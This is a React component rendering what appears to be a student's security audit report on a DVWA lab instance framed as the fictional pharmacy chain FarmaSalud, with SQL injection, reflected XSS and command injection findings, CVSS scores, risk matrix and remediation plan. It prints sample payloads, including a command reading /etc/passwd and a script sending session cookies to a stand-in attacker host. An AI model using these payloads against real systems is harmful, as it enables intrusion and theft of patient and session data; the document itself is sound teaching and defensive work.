import React, { useState, useEffect } from 'react';
import './App.css';

// Importación de las imágenes
import comandosImg from './img_grocat/comandos_grocat.png';
import sqliImg from './img_grocat/sqli_grocat.png';
import xssImg from './img_grocat/xss_grocat.png';

export default function Matriz() {
  const [seccionActiva, setSeccionActiva] = useState('resumen');
  const [riesgoSeleccionado, setRiesgoSeleccionado] = useState(null);

  const riesgosData = {
      'R-01': { 
        id: 'R-01', 
        vuln: 'Inyección SQL (SQLi)', 
        amenaza: 'Filtración Masiva de Recetas y Datos: Un atacante extrae la base de datos completa de pacientes, exponiendo patologías y tratamientos.', 
        prob: 4, 
        imp: 5, 
        nivel: 'CRÍTICO (20)' 
      },
      'R-02': { 
        id: 'R-02', 
        vuln: 'Command Injection', 
        amenaza: 'Secuestro Total del Servidor: El atacante ejecuta comandos de sistema operativo, toma control del backend e instala malware o detiene los servicios de farmacia.', 
        prob: 3, 
        imp: 5, 
        nivel: 'CRÍTICO (15)' 
      },
      'R-03': { 
        id: 'R-03', 
        vuln: 'XSS Reflejado', 
        amenaza: 'Robo de Puntos y Sesiones: Robo de cookies de autenticación de clientes mediante enlaces maliciosos para realizar fraudes en el programa de fidelización.', 
        prob: 4, 
        imp: 3, 
        nivel: 'ALTO (12)' 
      }
    };

  return (
    <div className="cod-dashboard">
      {/* HEADER TÁCTICO */}
      <header className="cod-header">
        <div className="cod-logo-area">
          <span className="cod-title-main">FARMASALUD</span>
          <span className="cod-title-sub">FUNDAMENTOS DE SEGURIDAD DE LA INFORMACIÓN // AUDITORIA_GROCAT</span>
        </div>

        <div className="cod-system-status">
          <span className="status-indicator online"></span> VULNERABILIDADES Y MATRIZ DE RIESGO: INACAP_2026
        </div>
      </header>

      <div className="cod-layout">
        {/* MENÚ DE SELECCIÓN LATERAL */}
        <aside className="cod-sidebar">
          <div className="sidebar-title">// SELECCIÓN DE MISIÓN</div>
          <nav className="cod-nav">
            <button className={`cod-nav-btn ${seccionActiva === 'resumen' ? 'active' : ''}`} onClick={() => setSeccionActiva('resumen')}>
              <span className="btn-id">01</span> RESUMEN EJECUTIVO
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'sqli' ? 'active' : ''}`} onClick={() => setSeccionActiva('sqli')}>
              <span className="btn-id">02</span> INYECCIÓN SQL (SQLi)
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'xss' ? 'active' : ''}`} onClick={() => setSeccionActiva('xss')}>
              <span className="btn-id">03</span> XSS REFLEJADO
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'comandos' ? 'active' : ''}`} onClick={() => setSeccionActiva('comandos')}>
              <span className="btn-id">04</span> INYECCIÓN DE COMANDOS
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'activos' ? 'active' : ''}`} onClick={() => setSeccionActiva('activos')}>
              <span className="btn-id">05</span> VALORACIÓN DE ACTIVOS
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'matriz_riesgo' ? 'active' : ''}`} onClick={() => setSeccionActiva('matriz_riesgo')}>
              <span className="btn-id">06</span> MATRIZ DE RIESGO
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'controles' ? 'active' : ''}`} onClick={() => setSeccionActiva('controles')}>
              <span className="btn-id">07</span> CUADRO DE CONTROLES
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'recuperacion' ? 'active' : ''}`} onClick={() => setSeccionActiva('recuperacion')}>
              <span className="btn-id">08</span> PLAN DE RECUPERACIÓN
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'prompts' ? 'active' : ''}`} onClick={() => setSeccionActiva('prompts')}>
              <span className="btn-id">09</span> BITÁCORA DE IA & REPO
            </button>
          </nav>
        </aside>

        {/* ÁREA DE CONTENIDO */}
        <main className="cod-content-area">
          
          {/* 01 RESUMEN EJECUTIVO */}
          {seccionActiva === 'resumen' && (
            <div className="animate-fade">
              <h2>01 // RESUMEN EJECUTIVO</h2>
              
              <div className="cod-card">
                <h3>1. CONTEXTO DE LA EMPRESA AUDITADA</h3>
                <p>FarmaSalud es una cadena de farmacias a nivel nacional enfocada en la venta de medicamentos, gestión de recetas médicas y programas de fidelización de clientes. Al operar en el sector de la salud, la infraestructura tecnológica de FarmaSalud procesa, almacena y transmite Datos Personales Sensibles de pacientes (fichas médicas, tratamientos, diagnósticos implícitos en recetas) y Datos Financieros/Personales de consumo a través de su Portal de Clientes.</p>
              </div>

              <div className="cod-card">
                <h3>2. EL PORTAL DE CLIENTES Y ACTIVOS CRÍTICOS</h3>
                <p>El Portal de Clientes permite a los usuarios consultar y cargar recetas médicas digitales, revisar el historial de compras y puntos de fidelización, y gestionar métodos de pago y despacho a domicilio. Debido a la naturaleza de la información, el portal interactúa directamente con bases de datos críticas que contienen Registros de Salud Electrónicos y Datos de Tarjetas de Pago. La confidencialidad y la integridad de este sistema son vitales para la continuidad del negocio y el cumplimiento legal (Ley de Protección de la Vida Privada).</p>
              </div>

              <div className="cod-card">
                <h3>3. ALCANCE DE LA AUDITORÍA</h3>
                <p>Esta evaluación de seguridad consistió en un análisis técnico de vulnerabilidades ejecutado sobre el ambiente controlado de pruebas del portal (basado en la plataforma de entrenamiento DVWA) configurado en un nivel de seguridad "Low". El objetivo fundamental es identificar el impacto que tendrían fallos críticos de inyección y scripting en el ecosistema real de FarmaSalud.</p>
              </div>
            </div>
          )}

{/* 02 SQLI */}
          {seccionActiva === 'sqli' && (
            <div className="animate-fade">
              <h2>02 // REPORTES TÉCNICOS: INYECCIÓN SQL</h2>
              
              <div className="cod-card border-high">
                <div className="cod-alert-tag high">AMENAZA CRÍTICA DETECTADA</div>
                <h3>1. EVIDENCIA DEL ATAQUE</h3>
                <p>El ataque se ejecutó explotando el formulario de consulta de ID del Portal de Clientes de FarmaSalud mediante la inyección de una compuerta lógica maliciosa.</p>
                <div className="cod-meta-list">
                  <div><strong>URL DE EXPLOTACIÓN:</strong> <span className="text-muted">https://dvwa-dnwe.onrender.com/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#</span></div>
                  <div><strong>PAYLOAD UTILIZADO:</strong> <code>' OR '1'='1</code></div>
                </div>
              </div>

            <div className="cod-card">
              <h3>3. ANÁLISIS TÉCNICO: ¿POR QUÉ FUNCIONA EL PAYLOAD?</h3>
              <p>
                El atacante ingresa <code>' OR '1'='1</code> en el campo de entrada. El servidor, al concatenar esta entrada directamente, genera la siguiente instrucción maliciosa:
              </p>

              <div className="cod-code-box">
                <code>SELECT nombre, apellido FROM usuarios WHERE id = '' OR '1'='1';</code>
              </div>

              <h4 style={{ marginTop: '20px' }}>DESGLOSE LÓGICO DEL ATAQUE:</h4>
              <ul className="technical-list">
                <li><strong>La primera comilla (<code>'</code>):</strong> Cierra prematuramente el valor del campo <code>id</code> que el programador definió entre comillas simples en el código original.</li>
                <li><strong>El comando <code>OR</code>:</strong> Operador lógico que instruye a la base de datos a considerar válida la fila si la condición del <code>id</code> es correcta O si la condición siguiente es verdadera.</li>
                <li><strong>La condición <code>'1'='1'</code>:</strong> Una tautología (afirmación siempre verdadera). Al evaluarse como verdadera, la base de datos devuelve todos los registros de la tabla, ignorando la restricción original.</li>
              </ul>
            </div>

            <div className="cod-card">
              <h3>3. RESUMEN DEL PERFIL DE RIESGO Y SEVERIDAD</h3>
              <p>Cada letra representa una métrica que define la facilidad y el impacto del ataque:</p>
              
              <div className="table-responsive">
                <table className="cod-table">
                  <thead>
                    <tr>
                      <th>Métrica</th>
                      <th>Descripción Técnica</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr><td><strong>AV:N</strong></td><td><strong>(Attack Vector - Network):</strong> El ataque es remoto (a través de la red). No requiere acceso físico ni local al servidor.</td></tr>
                    <tr><td><strong>AC:L</strong></td><td><strong>(Attack Complexity - Low):</strong> La complejidad es baja. No se requieren condiciones especiales; el atacante puede repetir el ataque fácilmente.</td></tr>
                    <tr><td><strong>PR:N</strong></td><td><strong>(Privileges Required - None):</strong> No se requieren privilegios. El atacante no necesita ser usuario registrado ni administrador.</td></tr>
                    <tr><td><strong>UI:N</strong></td><td><strong>(User Interaction - None):</strong> No se requiere interacción del usuario. El ataque ocurre de forma autónoma.</td></tr>
                    <tr><td><strong>S:U</strong></td><td><strong>(Scope - Unchanged):</strong> El impacto no se propaga a otros componentes; el daño se limita al componente vulnerable.</td></tr>
                    <tr><td><strong>C:H</strong></td><td><strong>(Confidentiality - High):</strong> El impacto en la confidencialidad es alto. Acceso total a datos sensibles (fichas clínicas).</td></tr>
                    <tr><td><strong>I:N</strong></td><td><strong>(Integrity - None):</strong> El impacto en la integridad es nulo. El atacante no puede modificar los datos.</td></tr>
                    <tr><td><strong>A:N</strong></td><td><strong>(Availability - None):</strong> El impacto en la disponibilidad es nulo. El ataque no causa la caída del sistema.</td></tr>
                  </tbody>
                </table>
              </div>

              <p style={{ marginTop: '15px', fontFamily: 'monospace' }}>
                <strong>VECTOR:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code>
              </p>

              <div className="severity-banner text-high">PUNTAJE BASE: 7.5 [ALTA]</div>
            </div>

            <div className="cod-card">
              <h3>4. ANÁLISIS DE IMPACTO: INYECCIÓN SQL (SQLi)</h3>
              <p>
                <strong>EXFILTRACIÓN DE DATOS SENSIBLES:</strong> Es el impacto principal. Al manipular la consulta SELECT original, el atacante puede extraer registros de la base de datos sin restricciones de seguridad.
                <br/><br/>
                <strong>Activos afectados:</strong> Registros de Salud Electrónicos (EHR), datos personales (RUT, historial clínico) y datos financieros de los pacientes.
                <br/><br/>
                <strong>Riesgo:</strong> Violación de la Ley 19.628 de Protección de la Vida Privada. La exfiltración de esta información sensible es el impacto más grave, ya que compromete la privacidad del paciente y genera responsabilidad legal para FarmaSalud.
              </p>
            </div>

              {/* PUNTO 5: EVIDENCIA VISUAL */}
              <div className="cod-card">
                <h3>5. REGISTRO DE EVIDENCIA GRÁFICA</h3>
                <img src={sqliImg} alt="SQLi Report" className="cod-intel-report" />
                <span className="cod-intel-caption">// AD-02_SQL_EXFILTRATION_LOG.PNG</span>
                <p>Captura de la ejecución del payload de inyección SQL en el portal.</p>
              </div>
            </div>
          )}



{/* 03 XSS */}
{seccionActiva === 'xss' && (
  <div className="animate-fade">
    <h2>03 // REPORTES TÉCNICOS: CROSS-SITE SCRIPTING REFLEJADO</h2>
    
    <div className="cod-card border-medium">
      <div className="cod-alert-tag medium">AMENAZA DE RIESGO MODERADO</div>
      <h3>1. EVIDENCIA DEL ATAQUE</h3>
      <p>El ataque se ejecutó inyectando código de JavaScript malicioso en el campo de entrada del formulario de saludo del portal de clientes.</p>
      <div className="cod-meta-list">
        <div><strong>PAYLOAD UTILIZADO:</strong> <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></div>
      </div>
    </div>

<div className="cod-card">
  <h3>3. ANÁLISIS TÉCNICO: ¿POR QUÉ FUNCIONA EL PAYLOAD?</h3>
  <p>
    El atacante inyecta el script malicioso <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> en un campo de entrada. La aplicación, al no realizar <strong>Output Encoding</strong>, inserta este código directamente en el HTML de la respuesta.
  </p>

  <div className="cod-code-box">
    {/* Representación de cómo el navegador recibe el HTML comprometido */}
    <code>&lt;div&gt;Hola, &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;</code>
  </div>

  <h4 style={{ marginTop: '20px' }}>DESGLOSE LÓGICO DEL ATAQUE:</h4>
  <ul className="technical-list">
    <li><strong>Etiqueta de Script:</strong> Al detectar <code>&lt;script&gt;</code>, el navegador de la víctima no lo trata como texto plano, sino como una instrucción ejecutable de JavaScript.</li>
    <li><strong>Ejecución en el Cliente:</strong> El navegador interpreta el comando <code>alert('XSS')</code>, desplegando una ventana emergente. En un escenario real, esto podría ser un script que robe cookies de sesión o redirija al usuario.</li>
    <li><strong>Falta de Sanitización:</strong> La vulnerabilidad reside en que el servidor web confía ciegamente en el input del usuario, permitiendo que caracteres especiales como <code>&lt;</code> y <code>&gt;</code> se rendericen como parte del código fuente de la página.</li>
  </ul>
</div>

<div className="cod-card">
  <h3>3. RESUMEN DEL PERFIL DE RIESGO: XSS REFLEJADO</h3>
  
  <div className="table-responsive">
    <table className="cod-table">
      <thead style={{ backgroundColor: '#222', color: '#fff' }}>
        <tr>
          <th>MÉTRICA</th>
          <th>DESCRIPCIÓN TÉCNICA (XSS)</th>
        </tr>
      </thead>
      <tbody>
        <tr><td><strong>AV : N</strong></td><td>(Attack Vector - Network): El ataque es remoto, ejecutado a través del navegador de la víctima.</td></tr>
        <tr><td><strong>AC : L</strong></td><td>(Attack Complexity - Low): No se requieren condiciones especiales; basta con enviar un enlace malicioso.</td></tr>
        <tr><td><strong>PR : N</strong></td><td>(Privileges Required - None): El atacante no necesita autenticarse en el sistema.</td></tr>
        <tr><td><strong>UI : R</strong></td><td>(User Interaction - Required): El ataque requiere que la víctima haga clic en un enlace o cargue la página.</td></tr>
        <tr><td><strong>S : C</strong></td><td>(Scope - Changed): El impacto se propaga al contexto del navegador del usuario.</td></tr>
        <tr><td><strong>C : L</strong></td><td>(Confidentiality - Low): Posible robo de cookies de sesión o información visible en pantalla.</td></tr>
        <tr><td><strong>I : L</strong></td><td>(Integrity - Low): Posibilidad de modificar la apariencia de la página o realizar acciones.</td></tr>
        <tr><td><strong>A : N</strong></td><td>(Availability - None): El ataque no afecta la disponibilidad del servidor.</td></tr>
      </tbody>
    </table>
  </div>

  <div style={{ marginTop: '20px', textAlign: 'center' }}>
    <p style={{ fontFamily: 'monospace' }}>
      <strong>VECTOR:</strong> <code style={{ backgroundColor: '#222', color: '#00ff00', padding: '5px 10px' }}>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code>
    </p>
    <div className="severity-banner text-medium" style={{ display: 'inline-block', padding: '5px 15px', border: '2px solid #ffcc00' }}>
      PUNTAJE BASE: 6.1 [MEDIA]
    </div>
  </div>
</div>

<div className="cod-card">
  <h3>4. ANÁLISIS DE IMPACTO: XSS REFLEJADO (CROSS-SITE SCRIPTING)</h3>
  <p>
    <strong>COMPROMISO DE LA SESIÓN DEL PACIENTE:</strong> Es el impacto principal. Al inyectar un script malicioso en la URL o campos de entrada, el atacante puede ejecutar código en el navegador del usuario legítimo.
    <br/><br/>
    <strong>Activos afectados:</strong> Cookies de sesión, tokens de autenticación, información visual del portal (datos de recetas) y credenciales almacenadas en el navegador.
    <br/><br/>
    <strong>Riesgo:</strong> Suplantación de identidad (Account Takeover). Un atacante puede robar la sesión activa del paciente y realizar compras o visualizar historiales médicos a su nombre. 
    <br/><br/>
    <strong>Medida de mitigación:</strong> Codificación de salida (Output Encoding) y políticas de seguridad de contenido (CSP).
  </p>
  
  <div className="cod-code-box">
    <code>{'// Ejemplo de ejecución en el cliente\n<script>fetch("https://atacker.com/steal?cookie=" + document.cookie);</script>'}</code>
  </div>
</div>

    {/* PUNTO 5: EVIDENCIA GRÁFICA */}
    <div className="cod-card">
      <h3>5. REGISTRO DE EVIDENCIA GRÁFICA</h3>
      {xssImg ? (
        <img src={xssImg} alt="XSS Report" className="cod-intel-report" />
      ) : (
        <p>Imagen no cargada</p>
      )}
      <span className="cod-intel-caption">// AS-01_XSS_TRACE.PNG</span>
    </div>
  </div>
)}




{/* 04 COMANDOS */}
          {seccionActiva === 'comandos' && (
            <div className="animate-fade">
              <h2>04 // REPORTES TÉCNICOS: INYECCIÓN DE COMANDOS</h2>
              
              <div className="cod-card border-high">
                <div className="cod-alert-tag high">AMENAZA CRÍTICA DETECTADA</div>
                <h3>1. EVIDENCIA DEL ATAQUE</h3>
                <p>El ataque se realizó aprovechando un formulario de diagnóstico de red (herramienta de ping) integrado en el portal administrativo.</p>
                <div className="cod-meta-list">
                  <div><strong>PAYLOAD UTILIZADO:</strong> <code>127.0.0.1; cat /etc/passwd</code></div>
                </div>
              </div>

              <div className="cod-card">
                <h3>2. ANÁLISIS TÉCNICO (POR QUÉ FUNCIONA)</h3>
                <p>El aplicativo web llama internamente a una función de la shell (como <code>system()</code>) concatenando la entrada. Al utilizar el punto y coma <code>;</code> en Linux, el sistema operativo interpreta la línea de código como dos instrucciones independientes, ejecutando el comando de ping y acto seguido la lectura del archivo de usuarios y contraseñas (<code>/etc/passwd</code>) de manera no autorizada.</p>
              </div>

            <div className="cod-card">
              <h3>3. RESUMEN DEL PERFIL DE RIESGO: INYECCIÓN DE COMANDOS</h3>
              
              <div className="table-responsive">
                <table className="cod-table">
                  <thead style={{ backgroundColor: '#222', color: '#fff' }}>
                    <tr>
                      <th>MÉTRICA</th>
                      <th>DESCRIPCIÓN TÉCNICA (CMD INJECTION)</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr><td><strong>AV : N</strong></td><td>(Attack Vector - Network): Ataque remoto sin necesidad de acceso físico.</td></tr>
                    <tr><td><strong>AC : L</strong></td><td>(Attack Complexity - Low): Ejecución inmediata mediante comandos estándar.</td></tr>
                    <tr><td><strong>PR : N</strong></td><td>(Privileges Required - None): No requiere autenticación.</td></tr>
                    <tr><td><strong>UI : N</strong></td><td>(User Interaction - None): El ataque ocurre de forma autónoma.</td></tr>
                    <tr><td><strong>S : U</strong></td><td>(Scope - Unchanged): El impacto se mantiene dentro del servidor comprometido.</td></tr>
                    <tr><td><strong>C : H</strong></td><td>(Confidentiality - High): Acceso total a archivos del servidor.</td></tr>
                    <tr><td><strong>I : H</strong></td><td>(Integrity - High): Control total para modificar o borrar archivos.</td></tr>
                    <tr><td><strong>A : H</strong></td><td>(Availability - High): Capacidad de detener o destruir la infraestructura.</td></tr>
                  </tbody>
                </table>
              </div>

              <div style={{ marginTop: '20px', textAlign: 'center' }}>
                <p style={{ fontFamily: 'monospace' }}>
                  <strong>VECTOR:</strong> <code style={{ backgroundColor: '#222', color: '#00ff00', padding: '5px 10px' }}>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>
                </p>
                <div className="severity-banner text-critical" style={{ display: 'inline-block', padding: '5px 15px', border: '2px solid #ff0000', backgroundColor: '#ffeef0' }}>
                  PUNTAJE BASE: 9.8 [CRÍTICA]
                </div>
              </div>
            </div>

              {/* PUNTO 5: EVIDENCIA GRÁFICA */}
              <div className="cod-card">
                <h3>5. REGISTRO DE EVIDENCIA GRÁFICA</h3>
                <img src={comandosImg} alt="Command Injection Report" className="cod-intel-report" />
                <span className="cod-intel-caption">// AI-01_SHELL_EXEC_LOG.PNG</span>
                <p>Captura de la ejecución del comando para leer archivos sensibles del sistema.</p>
              </div>
            </div>
          )}

          {/* 05 VALORACIÓN DE ACTIVOS */}
          {seccionActiva === 'activos' && (
            <div className="animate-fade">
              <h2>05 // INVENTARIO Y VALORACIÓN DE ACTIVOS CRÍTICOS</h2>
              
              <div className="cod-card">
                <h3>1. IDENTIFICACIÓN DE ACTIVOS</h3>
                <div className="cod-tactical-list">
                  <div className="list-item"><span className="bullet">[▲]</span> <strong>AD-01 Base de Datos (EHR):</strong> Fichas médicas e historial clínico de pacientes.</div>
                  <div className="list-item"><span className="bullet">[▲]</span> <strong>AD-02 Base de Datos de Clientes:</strong> Identidades, RUT, hashes de contraseñas y correos.</div>
                  <div className="list-item"><span className="bullet">[▲]</span> <strong>AD-03 Datos de Tarjetas (PCI):</strong> Transacciones financieras y pasarela de pago.</div>
                  <div className="list-item"><span className="bullet">[▲]</span> <strong>AS-01 Portal de Clientes:</strong> Aplicación web frontend/backend principal de la empresa.</div>
                  <div className="list-item"><span className="bullet">[▲]</span> <strong>AI-01 Servidor de Aplicaciones:</strong> Entorno Docker que aloja la API y backend.</div>
                </div>
              </div>

              <div className="cod-card">
                <h3>2. MATRIZ DE VALORACIÓN CRÍTICA</h3>
                <div className="table-responsive">
                  <table className="cod-table">
                    <thead>
                      <tr>
                        <th>ID</th>
                        <th>NOMBRE DEL ACTIVO</th>
                        <th>CONFIDENCIALIDAD</th>
                        <th>INTEGRIDAD</th>
                        <th>DISPONIBILIDAD</th>
                        <th>JUSTIFICACIÓN LEGAL / OPERATIVA</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td><strong>AD-01</strong></td>
                        <td>Base de Datos de Salud (EHR)</td>
                        <td className="table-cell-critica">ALTA (H)</td>
                        <td className="table-cell-critica">ALTA (H)</td>
                        <td className="table-cell-critica">ALTA (H)</td>
                        <td>Ley de Protección de la Vida Privada (Datos Sensibles).</td>
                      </tr>
                      <tr>
                        <td><strong>AD-02</strong></td>
                        <td>Base de Datos de Clientes</td>
                        <td className="table-cell-critica">ALTA (H)</td>
                        <td>MEDIA (M)</td>
                        <td>MEDIA (M)</td>
                        <td>Datos personales. Alto riesgo de phishing corporativo si se filtra.</td>
                      </tr>
                      <tr>
                        <td><strong>AD-03</strong></td>
                        <td>Datos de Tarjetas de Pago</td>
                        <td className="table-cell-critica">ALTA (H)</td>
                        <td className="table-cell-critica">ALTA (H)</td>
                        <td>MEDIA (M)</td>
                        <td>Regulado por estándares internacionales obligatorios PCI-DSS.</td>
                      </tr>
                      <tr>
                        <td><strong>AS-01</strong></td>
                        <td>Portal de Clientes</td>
                        <td>MEDIA (M)</td>
                        <td className="table-cell-critica">ALTA (H)</td>
                        <td className="table-cell-critica">ALTA (H)</td>
                        <td>Canal de venta digital principal. Su caída paraliza la operación.</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {/* 06 MATRIZ DE RIESGO */}
          {seccionActiva === 'matriz_riesgo' && (
            <div className="animate-fade">
              <h2>06 // MATRIZ DE RIESGO DE CIBERSEGURIDAD</h2>
              
              <div className="cod-card">
                <h3>1. MAPA DE CALOR OPERATIVO (PROBABILIDAD X IMPACTO)</h3>
                <p className="instruction-text">Selecciona un código de threat en el radar interactivo para inspeccionar sus parámetros de intelligence:</p>
                
                <div className="cod-grid-container">
                  <div className="cod-matrix-heat">
                    <div className="matrix-grid">
                      {[5, 4, 3, 2, 1].map((impacto) => (
                        <div key={impacto} className="matrix-row">
                          <span className="axis-label-y">{impacto}</span>
                          {[1, 2, 3, 4, 5].map((probabilidad) => {
                            let celdaClase = "cell-normal";
                            let textoCelda = "";
                            let idRiesgo = null;

                            if (probabilidad === 4 && impacto === 5) { celdaClase = "cell-critica"; textoCelda = "R-01"; idRiesgo = "R-01"; }
                            if (probabilidad === 3 && impacto === 5) { celdaClase = "cell-critica"; textoCelda = "R-02"; idRiesgo = "R-02"; }
                            if (probabilidad === 4 && impacto === 3) { celdaClase = "cell-alta"; textoCelda = "R-03"; idRiesgo = "R-03"; }

                            return (
                              <button 
                                key={probabilidad} 
                                className={`matrix-cell ${celdaClase} ${riesgoSeleccionado === idRiesgo && idRiesgo ? 'selected-cell' : ''}`}
                                onClick={() => idRiesgo && setRiesgoSeleccionado(idRiesgo)}
                                disabled={!idRiesgo}
                              >
                                {textoCelda}
                              </button>
                            );
                          })}
                        </div>
                      ))}
                      <div className="matrix-row axis-x-row">
                        <span></span>
                        {[1, 2, 3, 4, 5].map((p) => <span key={p} className="axis-label-x">{p}</span>)}
                      </div>
                    </div>
                  </div>

                  <div className="cod-threat-visor">
                    <div className="visor-header">// INTELIGENCIA DE AMENAZAS</div>
                    {riesgoSeleccionado ? (
                      <div className="visor-body animate-fade">
                        <div className="visor-row"><strong>AMENAZA:</strong> <span className="highlight-orange">{riesgosData[riesgoSeleccionado].id}</span></div>
                        <div className="visor-row"><strong>VULNERABILIDAD:</strong> {riesgosData[riesgoSeleccionado].vuln}</div>
                        <div className="visor-row"><strong>DAÑO ESTIMADO:</strong> {riesgosData[riesgoSeleccionado].amenaza}</div>
                        <div className="visor-row"><strong>VALOR RIESGO:</strong> {riesgosData[riesgoSeleccionado].nivel}</div>
                      </div>
                    ) : (
                      <div className="visor-placeholder">RADAR EN ESPERA: SELECCIONE UN CÓDIGO R-XX EN LA MATRIZ</div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* 07 CUADRO DE CONTROLES */}
          {seccionActiva === 'controles' && (
            <div className="animate-fade">
              <h2>07 // CUADRO DE MANDOS: CONTROLES DE SEGURIDAD</h2>
              
              <div className="cod-card">
                <h3>MATRIZ DE IMPLEMENTACIÓN (DEFENSA EN PROFUNDIDAD)</h3>
                <div className="table-responsive">
                  <table className="cod-table">
                    <thead>
                      <tr>
                        <th>ID CONTROL</th>
                        <th>TIPO</th>
                        <th>DESCRIPCIÓN TÉCNICA</th>
                        <th>ESTADO OPERATIVO</th>
                        <th>VULNERABILIDAD ASOCIADA</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td><strong>CTRL-01</strong></td>
                        <td>Preventivo</td>
                        <td>Implementación de <strong>Consultas Parametrizadas (Prepared Statements)</strong> en todo el backend.</td>
                        <td className="status-pending">PENDIENTE</td>
                        <td>Inyección SQL (SQLi)</td>
                      </tr>
                      <tr>
                        <td><strong>CTRL-02</strong></td>
                        <td>Preventivo</td>
                        <td>Activación de codificación de salida adaptativa al contexto (<strong>Output Encoding</strong>) en vistas.</td>
                        <td className="status-pending">PENDIENTE</td>
                        <td>XSS Reflejado</td>
                      </tr>
                      <tr>
                        <td><strong>CTRL-03</strong></td>
                        <td>Preventivo</td>
                        <td>Prohibición absoluta de funciones de shell (<code>system()</code>), usando APIs de red nativas.</td>
                        <td className="status-pending">PENDIENTE</td>
                        <td>Inyección de Comandos</td>
                      </tr>
                      <tr>
                        <td><strong>CTRL-04</strong></td>
                        <td>Detectivo</td>
                        <td>Despliegue de un <strong>Web Application Firewall (WAF)</strong> perimetral en producción.</td>
                        <td className="status-planned">PLANIFICADO</td>
                        <td>Transversal (SQLi, XSS, CmdInj)</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {/* 08 PLAN DE RECUPERACIÓN */}
          {seccionActiva === 'recuperacion' && (
            <div className="animate-fade">
              <h2>08 // ESTRATEGIA Y PLAN DE RECUPERACIÓN ANTE DESASTRES</h2>
              
              <div className="cod-card">
                <h3>1. PLAN DE ACCIÓN INMEDIATO (REMEDIACIÓN DE CÓDIGO)</h3>
                <p><strong>Fase 1 [Bloqueo Crítico - Próximas 24 horas]:</strong> Parchear de forma prioritaria el fallo de Command Injection y reescribir las llamadas SQL de login a formato parametrizado.</p>
                <p><strong>Fase 2 [Mitigación Web - Próximas 72 horas]:</strong> Desplegar parches XSS e inyectar cabeceras HTTP de seguridad (<code>Content-Security-Policy</code>).</p>
              </div>

              <div className="cod-card">
                <h3>2. PROTOCOLO DE RESPUESTA A INCIDENTES</h3>
                <p><strong>Contención:</strong> Aislamiento de red inmediato del servidor comprometido para detener fugas de datos y revocación total de tokens activos en la base de datos.</p>
                <p><strong>Erradicación:</strong> Reemplazar el backend web por la versión corregida desde el repositorio seguro de Git y restaurar bases de datos a partir de respaldos probados.</p>
              </div>
            </div>
          )}

          {/* 09 BITÁCORA DE IA & REPO */}
          {seccionActiva === 'prompts' && (
            <div className="animate-fade">
              <h2>09 // BITÁCORA DE ASISTENCIA IA & DEPLOY-OPS</h2>
              
              <div className="cod-card">
                <h3>ANÁLISIS DE DESARROLLO ASISTIDO POR IA</h3>
                <p>En creacion..</p>
              </div>

              <div className="cod-card command-center-card">
                <h3>DATOS DEL OPERADOR</h3>
                <div className="visor-row"><strong>ID USUARIO:</strong> <span className="highlight-orange">cgrohmann5</span></div>
                <div className="visor-row"><strong>ESTADO DEL REPOSITORIO:</strong> <span className="status-planned">VERIFICADO</span></div>
                
                {/* INTERFAZ DEL BOTÓN TÁCTICO INTEGRADA */}
                <div className="github-action-wrapper">
                  <a 
                    href="https://github.com/cgrohmann5" 
                    target="_blank" 
                    rel="noreferrer" 
                    className="cod-action-btn"
                  >
                    <span className="btn-main-text">CONECTAR REPOSITORIO GITHUB</span>
                    <span className="btn-sub-tag">// DEPLOY_OPS_FORGE</span>
                  </a>
                </div>
              </div>
            </div>
          )}

        </main>
      </div>
    </div>
  );
}